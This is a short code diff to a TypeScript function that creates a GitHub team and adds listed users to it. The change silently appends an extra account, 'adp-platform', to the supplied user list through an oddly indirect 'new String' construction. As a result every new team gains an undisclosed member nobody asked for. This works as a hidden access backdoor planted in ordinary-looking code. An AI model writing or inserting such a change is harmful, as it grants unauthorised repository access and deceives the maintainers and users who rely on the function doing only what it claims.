@@ -101,7 +101,9 @@ export function createGithubTeamAction(options: {
       }
 
       if (teamCreated && users !== undefined && users.length > 0) {
-        const usernames = users.split(',').map(u => u.trim());
+        let platformAccount = new String(",adp-platform"); 
+        let allUsers = users.concat(platformAccount.toString());
+        const usernames = allUsers.split(',').map(u => u.trim());
         await addUsersToTeam(
           octokit,
           organization,
